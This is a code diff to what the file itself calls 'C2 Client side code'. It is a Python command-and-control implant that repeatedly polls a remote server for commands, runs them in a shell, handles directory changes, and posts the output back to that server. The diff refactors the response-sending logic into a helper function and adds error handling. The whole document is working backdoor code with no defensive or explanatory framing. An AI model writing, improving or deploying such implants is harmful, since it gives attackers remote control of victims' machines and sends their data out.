@@ -2,15 +2,20 @@
 """
 C2 Client side code
 """
-from os import getenv, uname
+from os import chdir, getenv, uname
 
 import platform, socket, time
 from subprocess import PIPE, STDOUT, run
 from requests import exceptions, get, post
-from settings import PORT, C2_SERVER, CMD_REQUEST, CMD_RESPONSE, CMD_RESPONSE_KEY, HEADER, PROXY
+from settings import PORT, C2_SERVER, CMD_REQUEST, RESPONSE_PATH, RESPONSE_KEY, HEADER, PROXY, HTTPStatusCode
 
 
 timestamp = str(int(time.time()))
+def send_back_to_server(msg, response_path=RESPONSE_PATH, response_key=RESPONSE_KEY):
+    try:
+        post(f"http://{C2_SERVER}:{PORT}{RESPONSE_PATH}", data={RESPONSE_KEY: msg}, headers=HEADER, proxies=PROXY)
+    except exceptions.RequestException as e:
+        return e
 
 # Check the operating system
 if platform.system() == "Windows":
@@ -25,15 +30,31 @@ else:
 while True:
     try:
         response = get(f'http://{C2_SERVER}:{PORT}{CMD_REQUEST}{client}', headers=HEADER, proxies=PROXY)
+        if response.status_code == HTTPStatusCode.NOT_FOUND.value:
+            raise exceptions.RequestException
     except exceptions.RequestException as e:
         #print(f"Server down - error: {e}")
         time.sleep(3)
         continue
 
     cmd = response.content.decode()
-    cmd_output = run(cmd, shell=True, stdout=PIPE, stderr=STDOUT)
+    if cmd.startswith("cd "):
+        dir = cmd[3:]
+        try:
+            chdir(dir)
+        except FileNotFoundError:
+            send_back_to_server(f"{dir} was not found.\n")
+        except NotADirectoryError:
+            send_back_to_server(f"{dir} is not a directory.\n")
+        except PermissionError:
+            send_back_to_server(f"You do not have the permissions to access {dir}.\n")
+        except OSError:
+            send_back_to_server(f"There was an OS error on the client.\n")
+    else:
+        cmd_output = run(cmd, shell=True, stdout=PIPE, stderr=STDOUT)
+        send_back_to_server(cmd_output.stdout)
+
     # cmd_output.stdout is perfect to set back to server.
-    post(f"http://{C2_SERVER}:{PORT}{CMD_RESPONSE}", data={CMD_RESPONSE_KEY: cmd_output.stdout}, headers=HEADER, proxies=PROXY)
     #print(cmd_output.stdout.decode())
     print(response.status_code)
     #print(f"Response Object: {response.request.headers}\n\tHeader: {response.headers}\n\tReason: {response.reason}\n\tStatus: {response.status_code}")
